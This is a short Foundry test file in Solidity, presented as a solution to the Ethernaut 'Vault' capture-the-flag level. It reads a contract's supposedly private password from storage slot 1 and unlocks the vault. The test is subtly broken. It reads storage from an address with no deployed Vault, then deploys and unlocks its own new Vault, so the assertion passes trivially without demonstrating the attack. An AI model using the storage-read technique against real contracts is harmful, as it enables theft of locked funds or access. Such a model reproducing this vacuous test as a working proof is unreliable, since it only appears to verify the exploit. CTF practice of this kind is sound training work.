// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Vault} from "src/08/Vault.sol";

contract VaultTest is Test {

    Vault public level;

    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
        vm.prank(instance);    
    }

    function testVaultHack() public {

        vm.startPrank(hacker);
        
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        level = new Vault(password);
        level.unlock(password);
        assert(level.locked() == false);
        
        vm.stopPrank();
        
    }
}
